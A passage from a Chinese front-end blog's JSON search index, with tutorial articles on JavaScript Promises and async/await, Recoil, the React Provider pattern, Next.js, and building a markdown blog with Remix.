PHP","uri":"https://danacoding.github.io/others/php/iisphp/"},{"content":"一、Promise 概述 Promise 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。\n#. Promise 有 3 个状态  待定（pending）: 初始状态，既没有被兑现，也没有被拒绝。 已兑现（fulfilled）: 意味着操作成功完成。 已拒绝（rejected）: 意味着操作失败。  #. Promise 有 2 个方法  Promise.prototype.then Promise.prototype.catch  当然，就像常规 try {...} catch {...} 中的 finally 子句一样，promise 中也有 finally。\nfinally 是执行清理（cleanup）的很好的处理程序（handler），例如无论结果如何，都停止使用不再需要的加载指示符（indicator）\n1 2 3 4 5 6 7 8  new Promise((resolve, reject) =\u0026gt; { /* 做一些需要时间的事儿，然后调用 resolve/reject */ }) // 在 promise 为 settled 时运行，无论成功与否  .finally(() =\u0026gt; stop loading indicator) // 所以，加载指示器（loading indicator）始终会在我们处理结果/错误之前停止  .then(result =\u0026gt; show result, err =\u0026gt; show error)   #. Promise 有 2 个参数  resolve(value) — 如果任务成功完成并带有结果 value。 reject(error) — 如果出现了 error，error 即为 error 对象。  二、Promise 使用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 创建Promise let myPromise = new Promise((myResolve, myReject) =\u0026gt; { myResolve(); // when successful  myReject(); // when error }); // 使用Promise myPromise.then( function (value) { /* code if successful */ }, function (error) { /* code if some error */ } );   实例\n1 2 3 4 5 6 7 8 9 10 11  new Promise((res, rej) =\u0026gt; { setTimeout(() =\u0026gt; res(1), 1000); }) .then((res) =\u0026gt; { console.log(res); // 1  return res * 2; }) .then((res) =\u0026gt; { console.log(res); // 2  });   三、async/await  简单来说，它们是基于 promises 的语法糖，使异步代码更易于编写和阅读。 通过使用它们，异步代码看起来更像是老式同步代码。 ！！！这才是所有回调的最佳（至少目前来说）使用方式！！！  #. function 中的使用方法 1 2 3 4 5 6  (async () =\u0026gt; { let response = await fetch(\u0026#39;/article/promise-chaining/user.json\u0026#39;); let user = await response.json(); ... })();   #. class 中的使用方法 1 2 3 4 5 6 7 8 9 10  class Waiter { async wait() { return await Promise.resolve(1); } } new Waiter() .wait() .then(alert); // 1（alert 等同于 result =\u0026gt; alert(result)）   ","description":"Promise 对象用于表示一个异步操作的最终完成 (或失败)及其结果值。","id":53,"section":"jsts","tags":null,"title":"Promise, async/await","uri":"https://danacoding.github.io/jsts/function/promise/"},{"content":"Recoil 是 React 官方 meta (facebook) 官方实验室的状态管理库，贴合 React hooks，自由度很高，所以要在项目中做一些规范，以便提供最佳的实践。\n官方文档有对核心概念的解释，但是，这里主要以我个人的理解去诠释这些核心概念。\natom 是 Recoil 的核心概念，在项目中，主要将它用来初始化一个状态。那如何处理这个状态呢，selectorFamily 就像一面镜子，它可以折射 atom 的状态给组件(当然，这里最好就是直接从atom读取状态)，也可以将组件想要改变的状态意图通过它来折射给 atom。\n最佳目录结构 /pages/index.tsx\r/components/plus.component.tsx\r/components/minus.component.tsx\r/components/reset.component.tsx\r/recoil/count.recoil.ts\r/recoil/count.recoil.ts import {\ratom,\rDefaultValue,\rselectorFamily,\r} from 'recoil';\rconst count = atom({\rkey: 'count',\rdefault: 0\r});\rconst changeCount = selectorFamily({\rkey: 'changeCount',\rget: () =\u0026gt; ({ get }) =\u0026gt; { return get(count) },\rset: (params) =\u0026gt; ({ set }, newValue: any) =\u0026gt; {\rswitch (params) {\rcase '+':\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue + 1)\r);\rbreak;\rcase '-':\rif (newValue \u0026gt;= 1) {\rset(\rcount,\rnewValue instanceof DefaultValue ? newValue : (newValue - 1)\r)\r};\rbreak;\rdefault: set(\rcount,\rnewValue\r);\r};\r}\r});\rexport { count, changeCount };\r/pages/index.tsx import Plus from '../components/plus.component';\rimport Minus from '../components/minus.component';\rimport CountReset from '../components/countReset.component';\rimport { useRecoilState, useRecoilValue, useResetRecoilState } from 'recoil';\rimport { changeCount, count } from '../recoil/count.recoil';\rconst value = useRecoilValue(count);\rconst [plusCount, setPlusCount] = useRecoilState(changeCount('+'));\rconst plusFunc = () =\u0026gt; setPlusCount(plusCount);\rconst [minusCount, setMinusCount] = useRecoilState(changeCount('-'));\rconst minusFunc = () =\u0026gt; setMinusCount(minusCount);\rconst resetFunc = useResetRecoilState(changeCount(''));\r\u0026lt;h1\u0026gt;{value}\u0026lt;/h1\u0026gt;\r\u0026lt;Plus plusFunc={plusFunc} /\u0026gt;\r\u0026lt;Minus minusFunc={minusFunc} /\u0026gt;\r\u0026lt;CountReset resetFunc={resetFunc} /\u0026gt;\r/components/plus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.plusFunc}\u0026gt;+\u0026lt;/button\u0026gt;\r)\r}\r/component/minus.component.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.minusFunc}\u0026gt;-\u0026lt;/button\u0026gt;\r)\r}\r/components/resetCount.tsx export default function (props:any) {\rreturn (\r\u0026lt;button onClick={props.resetFunc}\u0026gt;reset\u0026lt;/button\u0026gt;\r)\r}\r","description":"React 官方实验室的状态管理解决方案，但是我感觉并不如社区中的Zustand好用","id":54,"section":"react","tags":null,"title":"Recoil 最佳实践","uri":"https://danacoding.github.io/react/recoil/recoil-bp/"},{"content":"在某些情况下，我们希望为应用程序中的许多（如果不是全部）组件提供可用数据。\n\r单向数据流 props 存在的问题 虽然我们可以使用 props 将数据传递给组件，但如果应用程序中的几乎所有组件都需要访问 props 的值，这可能很难做到。\n我们经常会得到一些叫做 prop 钻孔的东西，当我们将 props 向下传递到组件树时就是这种情况。\n重构依赖于 props 的代码变得几乎不可能，而且知道某些数据来自哪里也很困难。\n假设我们有一个包含某些数据的 App 组件。 在组件树的最下方，我们有一个 ListItem、Header 和 Text 组件，它们都需要这些数据。 为了将这些数据传递给这些组件，我们必须通过多层组件传递它。\n在我们的代码库中，这将类似于以下内容：\nfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar data={data} /\u0026gt;\r\u0026lt;Content data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = ({ data }) =\u0026gt; \u0026lt;List data={data} /\u0026gt;\rconst List = ({ data }) =\u0026gt; \u0026lt;ListItem data={data} /\u0026gt;\rconst ListItem = ({ data }) =\u0026gt; \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;\rconst Content = ({ data }) =\u0026gt; (\r\u0026lt;div\u0026gt;\r\u0026lt;Header data={data} /\u0026gt;\r\u0026lt;Block data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\rconst Header = ({ data }) =\u0026gt; \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;\rconst Block = ({ data }) =\u0026gt; \u0026lt;Text data={data} /\u0026gt;\rconst Text = ({ data }) =\u0026gt; \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt;\r以这种方式传递道具会变得非常混乱。如果我们想在未来重命名 data prop，我们必须在所有组件中重命名它。您的应用程序越大，道具钻孔就越棘手。\n我们最好可以跳过不需要使用这些数据的所有组件层。我们需要一些东西，让需要访问数据值的组件直接访问它，而不依赖于道具钻取。\n\rProvider 提供者 这就是提供者 Provider 模式可以帮助我们的地方！使用提供者模式，我们可以使数据可供多个组件使用。\n我们可以将所有组件包装在一个 Provider 中，而不是通过 props 将数据向下传递到每一层。\nProvider 是一个由 Context 对象提供给我们的高阶组件。\n我们可以使用 React 为我们提供的 createContext 方法创建一个 Context 对象。\nProvider 接收一个 value prop，其中包含我们想要传递的数据。包装在此 Provider 中的所有组件都可以访问 value 属性的值。\nconst DataContext = React.createContext()\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;DataContext.Provider value={data}\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/DataContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r我们不再需要手动将数据属性传递给每个组件！ 那么，ListItem、Header、Text 组件如何访问数据的值呢？\n每个组件都可以通过使用 useContext 钩子来访问数据。 这个钩子接收数据引用的上下文，在这种情况下是 DataContext 。 useContext 钩子让我们可以读取和写入数据到上下文对象。\nconst DataContext = React.createContext();\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = () =\u0026gt; \u0026lt;List /\u0026gt;\rconst List = () =\u0026gt; \u0026lt;ListItem /\u0026gt;\rconst Content = () =\u0026gt; \u0026lt;div\u0026gt;\u0026lt;Header /\u0026gt;\u0026lt;Block /\u0026gt;\u0026lt;/div\u0026gt;\rfunction ListItem() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;;\r}\rfunction Text() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt;;\r}\rfunction Header() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;;\r}\r不使用数据值的组件根本不必处理数据。 我们不再需要担心通过不需要 props 值的组件将 props 向下传递几个级别，这使得重构更容易。\n\r主题 Theme UI Provider 模式对于共享全局数据非常有用。 提供者模式的一个常见用例是与许多组件共享一个主题 UI 状态。\n假设我们有一个显示列表的简单应用程序。\n我们希望用户能够通过切换开关在亮模式和暗模式之间切换。 当用户从暗模式切换到亮模式（反之亦然）时，背景颜色和文本颜色应该改变！\n我们可以将组件包装在 ThemeProvider 中，并将当前主题颜色传递给提供程序，而不是将当前主题值向下传递给每个组件。\nexport const ThemeContext = React.createContext();\rconst themes = {\rlight: {\rbackground: \u0026quot;#fff\u0026quot;,\rcolor: \u0026quot;#000\u0026quot;\r},\rdark: {\rbackground: \u0026quot;#171717\u0026quot;,\rcolor: \u0026quot;#fff\u0026quot;\r}\r};\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026quot;dark\u0026quot;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026quot;light\u0026quot; ? \u0026quot;dark\u0026quot; : \u0026quot;light\u0026quot;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r由于 Toggle 和 List 组件都包含在 ThemeContext 提供程序中，我们可以访问作为值传递给提供者的值 theme 和 toggleTheme 。\n在 Toggle 组件中，我们可以使用 toggleTheme 函数相应地更新主题。\nimport React, { useContext } from \u0026quot;react\u0026quot;;\rimport { ThemeContext } from \u0026quot;./App\u0026quot;;\rexport default function Toggle() {\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;label className=\u0026quot;switch\u0026quot;\u0026gt;\r\u0026lt;input type=\u0026quot;checkbox\u0026quot; onClick={theme.toggleTheme} /\u0026gt;\r\u0026lt;span className=\u0026quot;slider round\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r);\r}\rList 组件本身并不关心主题的当前值。 但是，ListItem 组件需要！ 我们可以直接在 ListItem 中使用主题上下文。\nimport React, { useContext } from \u0026quot;react\u0026quot;;\rimport { ThemeContext } from \u0026quot;./App\u0026quot;;\rexport default function TextBox() {\rconst theme = useContext(ThemeContext);\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r}\rPerfect! 我们不必将任何数据传递给不关心主题当前值的组件。\n\rHooks 我们可以创建一个钩子来为组件提供上下文。 不必在每个组件中导入 useContext 和 Context，我们可以使用一个钩子来返回我们需要的上下文。\nfunction useThemeContext() {\rconst theme = useContext(ThemeContext);\rreturn theme;\r}\r为了确保它是一个有效的主题，让我们在 useContext(ThemeContext) 返回一个虚假值时抛出一个错误。\n1 2 3 4 5 6 7 8  function useThemeContext() { const theme = useContext(ThemeContext); if (!theme) { throw new Error(\u0026#34;useThemeContext 必须在 ThemeProvider 中使用\u0026#34;); } return theme; }   我们可以创建一个 HOC，使用提供的值添加返回此组件，而不是直接使用 ThemeContext.Provider 组件包装组件。 通过这种方式，我们可以将上下文逻辑与渲染组件分离，从而提高提供程序的可重用性。\nfunction ThemeProvider() {\rconst [theme, setTheme] = useState(\u0026quot;dark\u0026quot;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026quot;light\u0026quot; ? \u0026quot;dark\u0026quot; : \u0026quot;light\u0026quot;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r{children}\r\u0026lt;/ThemeContext.Provider\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r每个需要访问 ThemeContext 的组件现在可以简单地使用 useThemeContext 钩子。\nexport default function TextBox() {\rconst theme = useThemeContext();\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r}\r通过为不同的上下文创建钩子，很容易将提供者的逻辑与呈现数据的组件分开。\n\r案例分析 一些库提供了内置的提供者，我们可以在消费组件中使用这些值。 一个很好的例子就是样式组件。\n理解这个例子不需要任何样式组件的经验。\nstyled-components 库为我们提供了一个 ThemeProvider。 每个样式组件都可以访问此提供程序的值！ 我们可以使用提供给我们的 API，而不是自己创建上下文 API！\n让我们使用相同的 List 示例，并将组件包装在从样式组件库导入的 ThemeProvider 中。\nimport { ThemeProvider } from \u0026quot;styled-components\u0026quot;;\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026quot;dark\u0026quot;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026quot;light\u0026quot; ? \u0026quot;dark\u0026quot; : \u0026quot;light\u0026quot;);\r}\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider theme={themes[theme]}\u0026gt;\r\u0026lt;\u0026gt;\r\u0026lt;Toggle toggleTheme={toggleTheme} /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r我们不会将内联样式道具传递给 ListItem 组件，而是将其设为 styled.li 组件。 由于它是一个样式组件，我们可以访问 theme 的值！\nimport styled from \u0026quot;styled-components\u0026quot;;\rexport default function ListItem() {\rreturn (\r\u0026lt;Li\u0026gt;\rLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\rtempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim\rveniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea\rcommodo consequat.\r\u0026lt;/Li\u0026gt;\r);\r}\rconst Li = styled.li`\r${({ theme }) =\u0026gt; `\rbackground-color: ${theme.backgroundColor};\rcolor: ${theme.color};\r`}\r`;\r太棒了，我们现在可以使用 ThemeProvider 轻松地将样式应用于我们所有的样式组件！\n\r优点 提供者模式/上下文 API 可以将数据传递给许多组件，而无需手动将其传递到每个组件层。\n它降低了重构代码时意外引入错误的风险。 以前，如果我们想要重命名一个 prop，我们必须在使用该值的整个应用程序中重命名该 prop。\n我们不再需要处理可被视为反模式的螺旋钻。 以前，可能很难理解应用程序的数据流，因为并不总是清楚某些 prop 值的来源。 使用 Provider 模式，我们不再需要不必要地将 props 传递给不关心这些数据的组件。\n使用 Provider 模式可以轻松保持某种全局状态，因为我们可以让组件访问此全局状态。\n\r缺点 在某些情况下，过度使用提供者模式会导致性能问题。 使用上下文的所有组件在每次状态更改时都会重新渲染。\n让我们看一个例子。 我们有一个简单的计数器，每次单击 Button 组件中的 Increment 按钮时，该计数器的值都会增加。 我们在重置组件中还有一个重置按钮，它将计数重置为 0。\n但是，当您单击 Increment 时，您会看到重新渲染的不仅仅是计数。 重置组件中的日期也会重新呈现！\nReset 组件也重新渲染，因为它消费了 useCountContext。 在较小的应用程序中，这不会太重要。 在较大的应用程序中，将频繁更新的值传递给许多组件会对性能产生负面影响。\n为确保组件不使用包含可能更新的不必要值的提供程序，您可以为每个单独的用例创建多个提供程序。\n\r知识点  React.createContext() Provider useContext  ","description":"使数据可用于多个子组件","id":55,"section":"patterns","tags":null,"title":"提供者模式","uri":"https://danacoding.github.io/patterns/design-patterns/provider-pattern/"},{"content":"Next.js：React 框架\nNext.js 提供生产所需的所有功能的最佳开发人员体验：混合静态和服务器渲染、TypeScript 支持、智能捆绑、路由预取等。无需配置。\nNext.js 旨在拥有一流的开发人员体验和许多内置功能\n  一个直观的基于页面的路由系统（支持动态路由）\n  预渲染，静态生成(SSG) 和服务器端渲染(SSR) 均以每页为基础支持\n  自动代码拆分以加快页面加载\n  具有优化预取的客户端路由\n  内置 CSS 和 Sass 支持，并支持任何 CSS-in-JS 库\n  支持快速刷新的开发环境\n  使用无服务器功能构建 API 端点的API 路由\n  完全可扩展\n  创建 Next.js 应用 1 2 3 4 5 6 7 8  yarn create next-app --typescript yarn dev //开发模式  yarn build //生产构建  yarn start //启动生产服务器   ","description":"React 开发框架，相比于umi更能融入最新的技术","id":56,"section":"react","tags":null,"title":"Next.js 速览","uri":"https://danacoding.github.io/react/next/next-base/"},{"content":"一、创建 Remix 应用 npx create-remix@latest\ryarn dev\r二、创建文件路由  app/root.tsx Layout 组件中\n \u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026quot;/posts\u0026quot;\u0026gt;Posts\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r 创建 app/routes/posts/index.tsx\n export default function Posts() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r三、加载数据 Remix 的路由文件相当于后端的模板视图，也是控制器，Remix 建立在 HTTP 和 HTML 的基础之上，因此整个过程无需在浏览器中使用 JavaScript。这也是 Remix 的创新之处，我目前的理解是 Remix 类似 Nodejs中间层 ，只是 Remix 将 React 整合到了中间层中。这样做的好处是少了一层，提升性能的同时简化了开发成本，让前端更专注于前端，后端更专注于后端。\nStep1. 项目根目录下（不是app目录） 创建本地文件模拟数据（真实项目往往是从服务器数据库请求数据）\n posts/my-first-post.md\n ---\rtitle: My First Post\r---\r# This is my first post\rIsn't it great?\r posts/90s-mix-cdr.md\n ---\rtitle: 90s Mixtape\r---\r# 90s Mixtape\r- I wish (Skee-Lo)\r- This Is How We Do It (Montell Jordan)\r- Everlong (Foo Fighters)\r- Ms. Jackson (Outkast)\r- Interstate Love Song (Stone Temple Pilots)\r- Killing Me Softly With His Song (Fugees, Ms. Lauryn Hill)\r- Just a Friend (Biz Markie)\r- The Man Who Sold The World (Nirvana)\r- Semi-Charmed Life (Third Eye Blind)\r- ...Baby One More Time (Britney Spears)\r- Better Man (Pearl Jam)\r- It's All Coming Back to Me Now (Céline Dion)\r- This Kiss (Faith Hill)\r- Fly Away (Lenny Kravits)\r- Scar Tissue (Red Hot Chili Peppers)\r- Santa Monica (Everclear)\r- C'mon N' Ride it (Quad City DJ's)\rStep2. 创建 app/post.ts 这个文件是处理posts的模块，在这里模拟请求数据\n 首先安装两个模块 fron-matter tiny-invariant\n yarn add front-matter //node模块\ryarn add tiny-invariant //类型检查\rimport path from \u0026quot;path\u0026quot;;\rimport fs from \u0026quot;fs/promises\u0026quot;;\rimport parseFrontMatter from \u0026quot;front-matter\u0026quot;;\rimport invariant from \u0026quot;tiny-invariant\u0026quot;;\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026quot;..\u0026quot;, \u0026quot;posts\u0026quot;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r}\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026quot;\u0026quot;),\rtitle: attributes.title\r};\r})\r);\r}\rStep3. app/routes/posts/index.tsx\nimport { Link, useLoaderData } from 'remix';\rimport { getPosts } from '~/post';\rimport type { Post } from '~/post';\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Posts() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Posts\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={post.slug}\u0026gt;{post.title}\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r};\r四、动态路由 Step1. 首先安装 @types/marked 将 markdown 解析为 HTML\nyarn add marked\ryarn add @types/marked\rStep2. 为 app/post.ts 模块添加一个函数 getPost\nimport path from \u0026quot;path\u0026quot;;\rimport fs from \u0026quot;fs/promises\u0026quot;;\rimport parseFrontMatter from \u0026quot;front-matter\u0026quot;;\rimport invariant from \u0026quot;tiny-invariant\u0026quot;;\rimport { marked } from 'marked';\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026quot;..\u0026quot;, \u0026quot;posts\u0026quot;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026quot;\u0026quot;),\rtitle: attributes.title\r};\r})\r);\r};\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026quot;.md\u0026quot;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r}\rStep3. 创建动态路由文件\n app/routes/posts/$slug.tsx\n import { useLoaderData } from 'remix';\rimport type { LoaderFunction } from 'remix';\rimport { getPost } from \u0026quot;~/post\u0026quot;;\rimport invariant from \u0026quot;tiny-invariant\u0026quot;;\rexport const loader: LoaderFunction = async ({ params }) =\u0026gt; {\rinvariant(params.slug, \u0026quot;expected params.slug\u0026quot;);\rreturn getPost(params.slug);\r};\rexport default function PostSlug() {\rconst post = useLoaderData();\rreturn (\r\u0026lt;div dangerouslySetInnerHTML={{ __html: post.html }} /\u0026gt;\r);\r};\r五、子路由（嵌套路由） Step1. 创建一个 admin 路由文件\n app/routes/admin.tsx 注意使用：Outlet\n import { Outlet, Link, useLoaderData } from \u0026quot;remix\u0026quot;;\rimport { getPosts } from \u0026quot;~/post\u0026quot;;\rimport type { Post } from \u0026quot;~/post\u0026quot;;\rimport adminStyles from \u0026quot;~/styles/admin.css\u0026quot;;\rexport const links = () =\u0026gt; {\rreturn [{ rel: \u0026quot;stylesheet\u0026quot;, href: adminStyles }];\r};\rexport const loader = () =\u0026gt; {\rreturn getPosts();\r};\rexport default function Admin() {\rconst posts = useLoaderData\u0026lt;Post[]\u0026gt;();\rreturn (\r\u0026lt;div className=\u0026quot;admin\u0026quot;\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;h1\u0026gt;Admin\u0026lt;/h1\u0026gt;\r\u0026lt;ul\u0026gt;\r{posts.map(post =\u0026gt; (\r\u0026lt;li key={post.slug}\u0026gt;\r\u0026lt;Link to={`/posts/${post.slug}`}\u0026gt;\r{post.title}\r\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r))}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;main\u0026gt;\r\u0026lt;Outlet/\u0026gt;\r\u0026lt;/main\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r};\r app/styles/admin.css\n .admin {\rdisplay: flex;\r}\r.admin \u0026gt; nav {\rpadding-right: 2rem;\r}\r.admin \u0026gt; main {\rflex: 1;\rborder-left: solid 1px #ccc;\rpadding-left: 2rem;\r}\rem {\rcolor: red;\r}\rStep2. 为 admin.tsx 创建子路由文件夹\n app/routes/admin/index.tsx\n import { Link } from \u0026quot;remix\u0026quot;;\rexport default function AdminIndex() {\rreturn (\r\u0026lt;p\u0026gt;\r\u0026lt;Link to=\u0026quot;new\u0026quot;\u0026gt;Create a New Post\u0026lt;/Link\u0026gt;\r\u0026lt;/p\u0026gt;\r);\r}\rStep3. 在 app/post.ts 处理新建Post的逻辑\nimport path from \u0026quot;path\u0026quot;;\rimport fs from \u0026quot;fs/promises\u0026quot;;\rimport parseFrontMatter from \u0026quot;front-matter\u0026quot;;\rimport invariant from \u0026quot;tiny-invariant\u0026quot;;\rimport { marked } from 'marked';\rexport type Post = {\rslug: string;\rtitle: string;\r};\rexport type PostMarkdownAttributes = {\rtitle: string;\r};\rtype NewPost = {\rtitle: string;\rslug: string;\rmarkdown: string;\r};\r// 相对于服务器输出而不是源！\rconst postsPath = path.join(__dirname, \u0026quot;..\u0026quot;, \u0026quot;posts\u0026quot;);\rfunction isValidPostAttributes(\rattributes: any\r): attributes is PostMarkdownAttributes {\rreturn attributes?.title;\r};\r//Post列表\rexport async function getPosts() {\rconst dir = await fs.readdir(postsPath);\rreturn Promise.all(\rdir.map(async filename =\u0026gt; {\rconst file = await fs.readFile(\rpath.join(postsPath, filename)\r);\rconst { attributes } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`${filename} 有错误的元数据！`\r);\rreturn {\rslug: filename.replace(/\\.md$/, \u0026quot;\u0026quot;),\rtitle: attributes.title\r};\r})\r);\r};\r// Post详情\rexport async function getPost(slug: string) {\rconst filepath = path.join(postsPath, slug + \u0026quot;.md\u0026quot;);\rconst file = await fs.readFile(filepath);\rconst { attributes, body } = parseFrontMatter(\rfile.toString()\r);\rinvariant(\risValidPostAttributes(attributes),\r`Post ${filepath} is missing attributes`\r);\rconst html = marked(body);\rreturn { slug, html, title: attributes.title };\r};\r// 新建Post\rexport async function createPost(post: NewPost) {\rconst md = `---\\ntitle: ${post.title}\\n---\\n\\n${post.markdown}`;\rawait fs.writeFile(\rpath.join(postsPath, post.slug + \u0026quot;.md\u0026quot;),\rmd\r);\rreturn getPost(post.slug);\r};\rStep4. 创建 app/routes/admin/new.tsx\nimport { useTransition, useActionData, Form, redirect } from \u0026quot;remix\u0026quot;;\rimport type { ActionFunction } from \u0026quot;remix\u0026quot;;\rimport { createPost } from \u0026quot;~/post\u0026quot;;\rimport invariant from \u0026quot;tiny-invariant\u0026quot;;\rtype PostError = {\rtitle?: boolean;\rslug?: boolean;\rmarkdown?: boolean;\r};\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rawait new Promise(res =\u0026gt; setTimeout(res, 1000));\rconst formData = await request.formData();\rconst title = formData.get(\u0026quot;title\u0026quot;);\rconst slug = formData.get(\u0026quot;slug\u0026quot;);\rconst markdown = formData.get(\u0026quot;markdown\u0026quot;);\rconst errors: PostError = {};\rif (!title) errors.title = true;\rif (!slug) errors.slug = true;\rif (!markdown) errors.markdown = true;\rif (Object.keys(errors).length) {\rreturn errors;\r}\rinvariant(typeof title === \u0026quot;string\u0026quot;);\rinvariant(typeof slug === \u0026quot;string\u0026quot;);\rinvariant(typeof markdown === \u0026quot;string\u0026quot;);\rawait createPost({ title, slug, markdown });\rreturn redirect(\u0026quot;/admin\u0026quot;);\r};\rexport default function NewPost() {\rconst errors = useActionData();\rconst transition = useTransition();\rreturn (\r\u0026lt;Form method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Title:{\u0026quot; \u0026quot;}\r{errors?.title \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Title is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;title\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label\u0026gt;\rPost Slug:{\u0026quot; \u0026quot;}\r{errors?.slug \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Slug is required\u0026lt;/em\u0026gt;}\r\u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;slug\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;label 